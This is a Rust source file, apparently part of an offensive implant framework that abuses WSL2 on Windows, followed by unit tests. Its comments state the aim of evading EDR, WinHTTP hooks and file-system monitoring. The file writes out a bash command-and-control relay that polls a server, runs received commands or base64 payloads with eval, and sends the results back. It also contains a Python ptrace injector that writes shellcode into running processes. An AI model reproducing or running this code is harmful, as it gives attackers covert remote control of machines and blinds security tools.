    /// Execute an HTTP GET request via `curl` inside WSL2.
    ///
    /// Because curl runs inside the WSL2 Linux VM, the request bypasses
    /// WinHTTP hooks and Windows network inspection.
    pub fn http_get(
        url: &str,
        headers: &[(String, String)],
        distro: Option<&str>,
    ) -> Result<Wsl2HttpResponse> {
        let mut header_args = String::new();
        for (key, value) in headers {
            header_args.push_str(&format!(" -H '{}:{}'", key, value));
        }

        let curl_cmd = format!(
            "curl -s -o - -w '\\n__HTTP_CODE__%{{http_code}}__HTTP_CODE__' {} '{}'",
            header_args, url
        );

        let result = Wsl2Executor::execute_wsl_command(&curl_cmd, distro)?;

        Self::parse_curl_output(&result.stdout, result.exit_code)
    }

    /// Execute an HTTP POST request via `curl` inside WSL2.
    pub fn http_post(
        url: &str,
        headers: &[(String, String)],
        body: &[u8],
        distro: Option<&str>,
    ) -> Result<Wsl2HttpResponse> {
        let mut header_args = String::new();
        for (key, value) in headers {
            header_args.push_str(&format!(" -H '{}{}'", key, value));
        }

        // Base64-encode the body for safe transport
        let b64_body = base64_encode(body);
        let curl_cmd = format!(
            "bash -c 'printf \"%s\" \"{}\" | base64 -d | curl -s -X POST -o - -w \\\n              \"\\n__HTTP_CODE__%{{http_code}}__HTTP_CODE__\" {} -d @- {}'",
            b64_body, header_args, url
        );

        let result = Wsl2Executor::execute_wsl_command(&curl_cmd, distro)?;

        Self::parse_curl_output(&result.stdout, result.exit_code)
    }

    /// Deploy a C2 relay inside WSL2.
    ///
    /// Writes a minimal relay script (bash + socat/curl) to the WSL2
    /// filesystem and runs it in the background.  The relay polls the
    /// C2 server and forwards data through the WSL2 network stack.
    pub fn setup_c2_via_wsl2(
        config: &Wsl2C2Config,
        distro: Option<&str>,
    ) -> Result<Wsl2Result> {
        // Generate the relay script
        let relay_script = Self::generate_relay_script(config);

        // Write and execute via temp-file method (the script is the "ELF")
        let script_bytes = relay_script.as_bytes();
        Wsl2Executor::execute_elf_via_temp_file(
            script_bytes,
            &[""], // no args — script is self-contained
            distro,
        )
    }

    /// Make an HTTP request using curl within WSL2.
    ///
    /// Convenience wrapper that handles both GET and POST.
    pub fn make_http_request_via_wsl2(
        method: &str,
        url: &str,
        headers: &[(String, String)],
        body: Option<&[u8]>,
        distro: Option<&str>,
    ) -> Result<Wsl2HttpResponse> {
        match method.to_uppercase().as_str() {
            "GET" => Self::http_get(url, headers, distro),
            "POST" => Self::http_post(url, headers, body.unwrap_or(&[]), distro),
            "PUT" => {
                let mut header_args = String::new();
                for (key, value) in headers {
                    header_args.push_str(&format!(" -H '{}{}'", key, value));
                }
                let b64_body = base64_encode(body.unwrap_or(&[]));
                let curl_cmd = format!(
                    "bash -c 'printf \"%s\" \"{}\" | base64 -d | curl -s -X PUT -o - -w \\\n                      \"\\n__HTTP_CODE__%{{http_code}}__HTTP_CODE__\" {} -d @- {}'",
                    b64_body, header_args, url
                );
                let result = Wsl2Executor::execute_wsl_command(&curl_cmd, distro)?;
                Self::parse_curl_output(&result.stdout, result.exit_code)
            }
            _ => bail!("Unsupported HTTP method: {}", method),
        }
    }

    /// Generate a bash relay script for C2 communication.
    fn generate_relay_script(config: &Wsl2C2Config) -> String {
        let mut header_args = String::new();
        for (key, value) in &config.headers {
            header_args.push_str(&format!("-H '{}:{}' ", key, value));
        }

        let proxy_arg = match &config.proxy {
            Some(p) => format!("--proxy '{}'", p),
            None => String::new(),
        };

        format!(
            r#"#!/bin/bash
# WSL2 C2 Relay — auto-generated
# Polls the C2 server and forwards data through WSL2 network

C2_URL="{c2_url}"
HEADERS="{headers}"
PROXY="{proxy}"
UA="{ua}"
INTERVAL={interval}
LISTEN="{listen}"

# JSON helpers — pure bash, no jq dependency.
json_str() {{
    local json="$1" key="$2"
    # Extract "key":"value" — handles simple string fields.
    local pat="\"$key\"[[:space:]]*:[[:space:]]*\""
    local rest="${{json#*$pat}}"
    if [ "$rest" = "$json" ]; then echo ""; return; fi
    echo "${{rest%%\"*}}"
}}

json_num() {{
    local json="$1" key="$2"
    local pat="\"$key\"[[:space:]]*:[[:space:]]*"
    local rest="${{json#*$pat}}"
    if [ "$rest" = "$json" ]; then echo "0"; return; fi
    # Trim trailing comma / brace / whitespace
    local val="${{rest%%[,\}}}}*}}"
    echo "$val" | tr -d '[:space:]'
}}

json_blob() {{
    local json="$1" key="$2"
    # Extract "key":"<base64 blob>"
    local pat="\"$key\"[[:space:]]*:[[:space:]]*\""
    local rest="${{json#*$pat}}"
    if [ "$rest" = "$json" ]; then echo ""; return; fi
    echo "${{rest%%\"*}}"
}}

send_result() {{
    local task_id="$1" output="$2" exit_code="$3"
    local b64_out
    b64_out=$(printf '%s' "$output" | base64 -w0)
    local payload="{{\"task_id\":\"$task_id\",\"output\":\"$b64_out\",\"exit_code\":$exit_code}}"
    curl -s {proxy_arg} -X POST {header_args} \
        -H "User-Agent: $UA" \
        -H "Content-Type: application/json" \
        -d "$payload" \
        "$C2_URL/result" >/dev/null 2>&1
}}

while true; do
    # Poll C2 for tasks
    RESP=$(curl -s {proxy_arg} {header_args} \
        -H "User-Agent: $UA" \
        -w "\n__HTTP_CODE__%{{http_code}}__HTTP_CODE__" \
        "$C2_URL/task" 2>/dev/null)

    # Extract HTTP status from our marker
    HTTP_CODE="${{RESP##*__HTTP_CODE__}}"
    RESP="${{RESP%%__HTTP_CODE__*}}"

    if [ -n "$RESP" ] && [ "$HTTP_CODE" -ge 200 ] 2>/dev/null && [ "$HTTP_CODE" -lt 300 ] 2>/dev/null; then
        # Parse task fields from JSON response.
        TASK_ID=$(json_str "$RESP" "task_id")
        CMD=$(json_str "$RESP" "cmd")
        B64_CMD=$(json_blob "$RESP" "payload")

        if [ -n "$TASK_ID" ]; then
            if [ -n "$CMD" ]; then
                # Execute the shell command and capture output.
                OUTPUT=$(eval "$CMD" 2>&1)
                EC=$?
                send_result "$TASK_ID" "$OUTPUT" "$EC"
            elif [ -n "$B64_CMD" ]; then
                # Decode base64 payload and execute.
                DECODED=$(printf '%s' "$B64_CMD" | base64 -d 2>/dev/null)
                OUTPUT=$(eval "$DECODED" 2>&1)
                EC=$?
                send_result "$TASK_ID" "$OUTPUT" "$EC"
            else
                # No executable content — acknowledge task.
                send_result "$TASK_ID" "no-op" 0
            fi
        fi
    fi

    # Jitter: sleep INTERVAL +/- 10%
    JITTER=$(( INTERVAL + (RANDOM % (INTERVAL / 5 + 1)) - (INTERVAL / 10) ))
    sleep "${{JITTER:-$INTERVAL}}"
done
"#,
            c2_url = config.c2_url,
            headers = config.headers.iter()
                .map(|(k, v)| format!("{}:{}", k, v))
                .collect::<Vec<_>>()
                .join(","),
            proxy = config.proxy.as_deref().unwrap_or(""),
            ua = config.user_agent,
            interval = config.poll_interval_s,
            listen = config.relay_listen,
            proxy_arg = proxy_arg,
            header_args = header_args,
        )
    }

    /// Parse curl output that contains our __HTTP_CODE__ marker.
    fn parse_curl_output(raw_output: &str, exit_code: u32) -> Result<Wsl2HttpResponse> {
        let marker_start = "\n__HTTP_CODE__";
        let marker_end = "__HTTP_CODE__";

        if let Some(idx) = raw_output.find(marker_start) {
            let body = raw_output[..idx].to_string();
            let rest = &raw_output[idx + marker_start.len()..];

            let status_code = if let Some(end_idx) = rest.find(marker_end) {
                rest[..end_idx].parse::<u32>().unwrap_or(0)
            } else {
                0
            };

            Ok(Wsl2HttpResponse {
                status_code,
                body,
                headers: Vec::new(), // curl -w doesn't capture response headers easily
                success: (200..300).contains(&status_code),
            })
        } else {
            // No marker — curl may have failed entirely
            Ok(Wsl2HttpResponse {
                status_code: 0,
                body: raw_output.to_string(),
                headers: Vec::new(),
                success: exit_code == 0,
            })
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Wsl2Injection — ptrace-based injection into WSL2 processes
// ═══════════════════════════════════════════════════════════════════════════

/// Injection into processes running inside WSL2 via ptrace.
///
/// Because WSL2 processes run in a Linux kernel context, Windows EDR
/// cannot monitor ptrace-based injection.  This is a Linux-native
/// technique invisible to Windows security products.
pub struct Wsl2Injection;

impl Wsl2Injection {
    /// Inject shellcode into a running WSL2 process by name.
    ///
    /// Uses a shell one-liner executed via `wsl.exe` that:
    /// 1. Finds the target process PID
    /// 2. Attaches via `ptrace(PTRACE_ATTACH)`
    /// 3. Writes shellcode to a rwx memory region via `/proc/<pid>/mem`
    /// 4. Modifies a register to point to the shellcode
    /// 5. Detaches, resuming execution at the shellcode
    ///
    /// **Note**: Requires that the WSL2 user has ptrace permissions
    /// (default for processes they own).
    pub fn inject_into_wsl2_process(
        target_name: &str,
        shellcode: &[u8],
        distro: Option<&str>,
    ) -> Result<Wsl2Result> {
        let b64_shellcode = base64_encode(shellcode);

        // Python3-based ptrace injector (more reliable than pure bash)
        let injector_script = format!(
            r#"python3 -c "
import ctypes, os, signal, struct, base64, sys

LIBC = ctypes.CDLL('libc.so.6', use_errno=True)
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
PTRACE_PEEKDATA = 2
PTRACE_POKEDATA = 5
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13

shellcode = base64.b64decode('{sc}')

# Find target PID
import subprocess
pid_out = subprocess.check_output(['pgrep', '-f', '{tgt}']).decode().strip()
if not pid_out:
    sys.exit(1)
pid = int(pid_out.split('\n')[0])

# Attach
if LIBC.ptrace(PTRACE_ATTACH, pid, 0, 0) != 0:
    sys.exit(2)
os.waitpid(pid, 0)

# Read registers
regs = (ctypes.c_ulonglong * 27)()
if LIBC.ptrace(PTRACE_GETREGS, pid, 0, ctypes.byref(regs)) != 0:
    LIBC.ptrace(PTRACE_DETACH, pid, 0, 0)
    sys.exit(3)

# Save original RIP
orig_rip = regs[16]  # RIP index in user_regs_struct

# Write shellcode to /proc/pid/mem
with open(f'/proc/{{pid}}/mem', 'rb+') as mem:
    # Write shellcode at current RIP (overwrite a few instructions)
    mem.seek(orig_rip)
    mem.write(shellcode)

# Detach — execution resumes at orig_rip which now contains our shellcode
LIBC.ptrace(PTRACE_DETACH, pid, 0, 0)
print(f'Injected {{len(shellcode)}} bytes into pid {{pid}}')
""#,
            sc = b64_shellcode,
            tgt = target_name,
        );

        Wsl2Executor::execute_wsl_command(&injector_script, distro)
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Wsl2FileAccess — file I/O through the /mnt/c/ bridge
// ═══════════════════════════════════════════════════════════════════════════

/// File access through the WSL2 `/mnt/c/` filesystem bridge.
///
/// Read and write Windows files from within WSL2.  This can be useful
/// for accessing files while evading file-system minifilter drivers that
/// may be monitoring Windows API file access.
pub struct Wsl2FileAccess;

impl Wsl2FileAccess {
    /// Read a Windows file via WSL2.
    ///
    /// Converts the Windows path to a WSL path and reads via `cat`.
    pub fn read_file_via_wsl2(
        windows_path: &str,
        distro: Option<&str>,
    ) -> Result<Vec<u8>> {
        let wsl_path = Wsl2Executor::windows_path_to_wsl(windows_path);
        let cmd = format!("cat '{}'", wsl_path);
        let result = Wsl2Executor::execute_wsl_command(&cmd, distro)?;

        if result.exit_code != 0 {
            bail!(
                "Failed to read {} via WSL2: {}",
                wsl_path,
                result.stderr
            );
        }

        Ok(result.stdout.into_bytes())
    }

    /// Write data to a Windows file via WSL2.
    ///
    /// Converts the Windows path to a WSL path and writes via base64
    /// decode + redirect to avoid shell escaping issues.
    pub fn write_file_via_wsl2(
        windows_path: &str,
        data: &[u8],
        distro: Option<&str>,
    ) -> Result<()> {
        let wsl_path = Wsl2Executor::windows_path_to_wsl(windows_path);
        let b64 = base64_encode(data);

        let cmd = format!(
            "bash -c 'echo \"{}\" | base64 -d > \"{}\"'",
            b64, wsl_path
        );

        let result = Wsl2Executor::execute_wsl_command(&cmd, distro)?;

        if result.exit_code != 0 {
            bail!(
                "Failed to write {} via WSL2: {}",
                wsl_path,
                result.stderr
            );
        }

        Ok(())
    }

    /// List directory contents via WSL2.
    pub fn list_dir_via_wsl2(
        windows_path: &str,
        distro: Option<&str>,
    ) -> Result<Vec<String>> {
        let wsl_path = Wsl2Executor::windows_path_to_wsl(windows_path);
        let cmd = format!("ls -1 '{}'", wsl_path);
        let result = Wsl2Executor::execute_wsl_command(&cmd, distro)?;

        if result.exit_code != 0 {
            bail!(
                "Failed to list {} via WSL2: {}",
                wsl_path,
                result.stderr
            );
        }

        Ok(result
            .stdout
            .lines()
            .map(|l| l.to_string())
            .collect())
    }

    /// Delete a file via WSL2.
    pub fn delete_file_via_wsl2(
        windows_path: &str,
        distro: Option<&str>,
    ) -> Result<()> {
        let wsl_path = Wsl2Executor::windows_path_to_wsl(windows_path);
        let cmd = format!("rm -f '{}'", wsl_path);
        let result = Wsl2Executor::execute_wsl_command(&cmd, distro)?;

        if result.exit_code != 0 {
            bail!(
                "Failed to delete {} via WSL2: {}",
                wsl_path,
                result.stderr
            );
        }

        Ok(())
    }

    /// Check if a file exists via WSL2.
    pub fn file_exists_via_wsl2(
        windows_path: &str,
        distro: Option<&str>,
    ) -> bool {
        let wsl_path = Wsl2Executor::windows_path_to_wsl(windows_path);
        let cmd = format!("test -f '{}' && echo YES", wsl_path);
        Wsl2Executor::execute_wsl_command(&cmd, distro)
            .map(|r| r.stdout.trim() == "YES")
            .unwrap_or(false)
    }

    /// Get file metadata (size, permissions, modification time) via WSL2.
    pub fn stat_file_via_wsl2(
        windows_path: &str,
        distro: Option<&str>,
    ) -> Result<String> {
        let wsl_path = Wsl2Executor::windows_path_to_wsl(windows_path);
        let cmd = format!("stat '{}'", wsl_path);
        let result = Wsl2Executor::execute_wsl_command(&cmd, distro)?;

        if result.exit_code != 0 {
            bail!("stat {} failed: {}", wsl_path, result.stderr);
        }

        Ok(result.stdout)
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Utility: base64 encoding
// ═══════════════════════════════════════════════════════════════════════════

/// Simple base64 encoder — no external crate dependency.
///
/// Standard base64 alphabet (RFC 4648 §4).
fn base64_encode(data: &[u8]) -> String {
    const TABLE: &[u8; 64] =
        b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    let mut out = String::with_capacity((data.len() + 2) / 3 * 4);

    let mut i = 0;
    while i + 2 < data.len() {
        let n = ((data[i] as u32) << 16) | ((data[i + 1] as u32) << 8) | (data[i + 2] as u32);
        out.push(TABLE[((n >> 18) & 0x3F) as usize] as char);
        out.push(TABLE[((n >> 12) & 0x3F) as usize] as char);
        out.push(TABLE[((n >> 6) & 0x3F) as usize] as char);
        out.push(TABLE[(n & 0x3F) as usize] as char);
        i += 3;
    }

    let remaining = data.len() - i;
    if remaining == 1 {
        let n = (data[i] as u32) << 16;
        out.push(TABLE[((n >> 18) & 0x3F) as usize] as char);
        out.push(TABLE[((n >> 12) & 0x3F) as usize] as char);
        out.push('=');
        out.push('=');
    } else if remaining == 2 {
        let n = ((data[i] as u32) << 16) | ((data[i + 1] as u32) << 8);
        out.push(TABLE[((n >> 18) & 0x3F) as usize] as char);
        out.push(TABLE[((n >> 12) & 0x3F) as usize] as char);
        out.push(TABLE[((n >> 6) & 0x3F) as usize] as char);
        out.push('=');
    }

    out
}

// ═══════════════════════════════════════════════════════════════════════════
// Unit tests
// ═══════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    // ── base64_encode tests ─────────────────────────────────────────────

    #[test]
    fn test_base64_empty() {
        assert_eq!(base64_encode(&[]), "");
    }

    #[test]
    fn test_base64_one_byte() {
        // 0x00 → "AA=="
        assert_eq!(base64_encode(&[0x00]), "AA==");
        // 0xFF → "/w=="
        assert_eq!(base64_encode(&[0xFF]), "/w==");
    }

    #[test]
    fn test_base64_two_bytes() {
        // "Ma" → 0x4D 0x61 → "TWE="
        assert_eq!(base64_encode(b"Ma"), "TWE=");
    }

    #[test]
    fn test_base64_three_bytes() {
        // "Man" → 0x4D 0x61 0x6E → "TWFu"
        assert_eq!(base64_encode(b"Man"), "TWFu");
    }

    #[test]
    fn test_base64_hello_world() {
        // "Hello, World!" — well-known test vector
        assert_eq!(
            base64_encode(b"Hello, World!"),
            "SGVsbG8sIFdvcmxkIQ=="
        );
    }

    #[test]
    fn test_base64_rfc4648_vectors() {
        assert_eq!(base64_encode(b""), "");
        assert_eq!(base64_encode(b"f"), "Zg==");
        assert_eq!(base64_encode(b"fo"), "Zm8=");
        assert_eq!(base64_encode(b"foo"), "Zm9v");
        assert_eq!(base64_encode(b"foob"), "Zm9vYg==");
        assert_eq!(base64_encode(b"fooba"), "Zm9vYmE=");
        assert_eq!(base64_encode(b"foobar"), "Zm9vYmFy");
    }

    #[test]
    fn test_base64_binary_data() {
        let data: Vec<u8> = (0u8..=255).collect();
        let encoded = base64_encode(&data);
        // Must be valid length: (256 + 2) / 3 * 4 = 344
        assert_eq!(encoded.len(), 344);
        // Must end without padding since 256 % 3 == 1 → "=="
        assert!(encoded.ends_with("=="));
    }

    // ── Path conversion tests ───────────────────────────────────────────

    #[test]
    fn test_windows_path_to_wsl_simple() {
        assert_eq!(
            Wsl2Executor::windows_path_to_wsl(r"C:\Users\foo\bar.txt"),
            "/mnt/c/Users/foo/bar.txt"
        );
    }

    #[test]
    fn test_windows_path_to_wsl_lowercase() {
        assert_eq!(
            Wsl2Executor::windows_path_to_wsl(r"d:\temp\test.elf"),
            "/mnt/d/temp/test.elf"
        );
    }

    #[test]
    fn test_windows_path_to_wsl_deep_path() {
        assert_eq!(
            Wsl2Executor::windows_path_to_wsl(
                r"C:\Users\admin\AppData\Local\Temp\w2e_abc123.elf"
            ),
            "/mnt/c/Users/admin/AppData/Local/Temp/w2e_abc123.elf"
        );
    }

    #[test]
    fn test_windows_path_to_wsl_no_drive() {
        // Relative path — should just swap slashes
        assert_eq!(
            Wsl2Executor::windows_path_to_wsl(r"relative\path\file.txt"),
            "relative/path/file.txt"
        );
    }

    #[test]
    fn test_wsl_path_to_windows_simple() {
        assert_eq!(
            Wsl2Executor::wsl_path_to_windows("/mnt/c/Users/foo/bar.txt"),
            r"C:\Users\foo\bar.txt"
        );
    }

    #[test]
    fn test_wsl_path_to_windows_d_drive() {
        assert_eq!(
            Wsl2Executor::wsl_path_to_windows("/mnt/d/temp/test.elf"),
            r"D:\temp\test.elf"
        );
    }

    #[test]
    fn test_wsl_path_to_windows_no_mnt() {
        // Non-/mnt path — should return unchanged
        assert_eq!(
            Wsl2Executor::wsl_path_to_windows("/home/user/file.txt"),
            "/home/user/file.txt"
        );
    }

    #[test]
    fn test_path_roundtrip() {
        let windows = r"C:\Users\test\file.bin";
        let wsl = Wsl2Executor::windows_path_to_wsl(windows);
        let back = Wsl2Executor::wsl_path_to_windows(&wsl);
        assert_eq!(back, windows);
    }

    #[test]
    fn test_path_roundtrip_d_drive() {
        let windows = r"D:\data\payload.elf";
        let wsl = Wsl2Executor::windows_path_to_wsl(windows);
        let back = Wsl2Executor::wsl_path_to_windows(&wsl);
        assert_eq!(back, windows);
    }

    // ── Distro list parsing tests ───────────────────────────────────────

    #[test]
    fn test_parse_distro_list_single() {
        let output = "  NAME            STATE           VERSION\n  * Ubuntu         Running         2\n";
        let distros = Wsl2Detector::parse_distro_list(output).unwrap();
        assert_eq!(distros.len(), 1);
        assert_eq!(distros[0].name, "Ubuntu");
        assert!(distros[0].is_default);
        assert_eq!(distros[0].version, 2);
        assert!(distros[0].running);
    }

    #[test]
    fn test_parse_distro_list_multiple() {
        let output = "  NAME            STATE           VERSION\n\
                       * Ubuntu         Running         2\n\
                         Debian         Stopped         1\n\
                         kali-linux     Running         2\n";
        let distros = Wsl2Detector::parse_distro_list(output).unwrap();
        assert_eq!(distros.len(), 3);
        assert_eq!(distros[0].name, "Ubuntu");
        assert!(distros[0].is_default);
        assert!(distros[0].running);
        assert_eq!(distros[1].name, "Debian");
        assert!(!distros[1].is_default);
        assert!(!distros[1].running);
        assert_eq!(distros[1].version, 1);
        assert_eq!(distros[2].name, "kali-linux");
        assert_eq!(distros[2].version, 2);
    }

    #[test]
    fn test_parse_distro_list_empty() {
        let output = "  NAME            STATE           VERSION\n";
        let distros = Wsl2Detector::parse_distro_list(output).unwrap();
        assert!(distros.is_empty());
    }

    #[test]
    fn test_parse_distro_list_garbage() {
        let output = "some garbage output";
        let distros = Wsl2Detector::parse_distro_list(output).unwrap();
        assert!(distros.is_empty());
    }

    // ── Curl output parsing tests ───────────────────────────────────────

    #[test]
    fn test_parse_curl_output_success() {
        let raw = "Hello, World!\n__HTTP_CODE__200__HTTP_CODE__";
        let resp = Wsl2Networking::parse_curl_output(raw, 0).unwrap();
        assert_eq!(resp.status_code, 200);
        assert_eq!(resp.body, "Hello, World!");
        assert!(resp.success);
    }

    #[test]
    fn test_parse_curl_output_404() {
        let raw = "Not Found\n__HTTP_CODE__404__HTTP_CODE__";
        let resp = Wsl2Networking::parse_curl_output(raw, 0).unwrap();
        assert_eq!(resp.status_code, 404);
        assert!(!resp.success);
    }

    #[test]
    fn test_parse_curl_output_no_marker() {
        let raw = "connection refused";
        let resp = Wsl2Networking::parse_curl_output(raw, 7).unwrap();
        assert_eq!(resp.status_code, 0);
        assert_eq!(resp.body, "connection refused");
        assert!(!resp.success);
    }

    #[test]
    fn test_parse_curl_output_empty_body() {
        let raw = "\n__HTTP_CODE__204__HTTP_CODE__";
        let resp = Wsl2Networking::parse_curl_output(raw, 0).unwrap();
        assert_eq!(resp.status_code, 204);
        assert_eq!(resp.body, "");
        assert!(resp.success);
    }

    // ── Struct serialization tests ──────────────────────────────────────

    #[test]
    fn test_wsl2_result_serde() {
        let r = Wsl2Result {
            stdout: "hello".to_string(),
            stderr: String::new(),
            exit_code: 0,
            pid: 1234,
        };
        let json = serde_json::to_string(&r).unwrap();
        let back: Wsl2Result = serde_json::from_str(&json).unwrap();
        assert_eq!(back.stdout, "hello");
        assert_eq!(back.exit_code, 0);
        assert_eq!(back.pid, 1234);
    }

    #[test]
    fn test_wsl2_status_serde() {
        let s = Wsl2Status {
            wsl_exe_found: true,
            lxss_service_running: true,
            distros: vec![Wsl2Distro {
                name: "Ubuntu".to_string(),
                is_default: true,
                version: 2,
                running: true,
            }],
            wsl2_available: true,
        };
        let json = serde_json::to_string(&s).unwrap();
        let back: Wsl2Status = serde_json::from_str(&json).unwrap();
        assert!(back.wsl_exe_found);
        assert_eq!(back.distros.len(), 1);
        assert_eq!(back.distros[0].name, "Ubuntu");
    }

    #[test]
    fn test_wsl2_http_response_serde() {
        let r = Wsl2HttpResponse {
            status_code: 200,
            body: "OK".to_string(),
            headers: vec![("Content-Type".into(), "text/plain".into())],
            success: true,
        };
        let json = serde_json::to_string(&r).unwrap();
        let back: Wsl2HttpResponse = serde_json::from_str(&json).unwrap();
        assert!(back.success);
        assert_eq!(back.headers.len(), 1);
    }

    #[test]
    fn test_wsl2_c2_config_serde() {
        let c = Wsl2C2Config {
            c2_url: "https://example.com/c2".to_string(),
            headers: vec![("Authorization".into(), "Bearer token".into())],
            proxy: Some("socks5://127.0.0.1:9050".into()),
            user_agent: "Mozilla/5.0".to_string(),
            poll_interval_s: 30,
            relay_listen: "127.0.0.1:8443".to_string(),
        };
        let json = serde_json::to_string(&c).unwrap();
        let back: Wsl2C2Config = serde_json::from_str(&json).unwrap();
        assert_eq!(back.c2_url, "https://example.com/c2");
        assert!(back.proxy.is_some());
    }

    // ── Wsl2Distro tests ────────────────────────────────────────────────

    #[test]
    fn test_distro_wsl1_detection() {
        let d = Wsl2Distro {
            name: "Debian".to_string(),
            is_default: false,
            version: 1,
            running: false,
        };
        assert_eq!(d.version, 1);
    }

    #[test]
    fn test_status_no_wsl2_available() {
        let s = Wsl2Status {
            wsl_exe_found: true,
            lxss_service_running: true,
            distros: vec![Wsl2Distro {
                name: "Debian".to_string(),
                is_default: true,
                version: 1,
                running: true,
            }],
            wsl2_available: false,
        };
        assert!(!s.wsl2_available);
    }

    // ── base64 roundtrip test ───────────────────────────────────────────

    #[test]
    fn test_base64_roundtrip() {
        // Verify our base64 encoding is standard-compatible
        let data = b"The quick brown fox jumps over the lazy dog";
        let encoded = base64_encode(data);
        // Decode with the standard library to verify
        let decoded = base64_decode_standard(&encoded);
        assert_eq!(decoded, data.to_vec());
    }

    /// Helper: standard base64 decode for testing only.
    fn base64_decode_standard(input: &str) -> Vec<u8> {
        const TABLE: &[u8; 64] =
            b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

        let mut result = Vec::new();
        let bytes = input.as_bytes();
        let mut i = 0;

        while i < bytes.len() {
            let mut accum: u32 = 0;
            let mut bits = 0u32;

            for _ in 0..4 {
                if i >= bytes.len() {
                    break;
                }
                let b = bytes[i];
                i += 1;
                if b == b'=' {
                    continue;
                }
                if let Some(pos) = TABLE.iter().position(|&c| c == b) {
                    accum = (accum << 6) | (pos as u32);
                    bits += 6;
                }
            }

            while bits >= 8 {
                bits -= 8;
                result.push(((accum >> bits) & 0xFF) as u8);
            }
        }

        result
    }
}
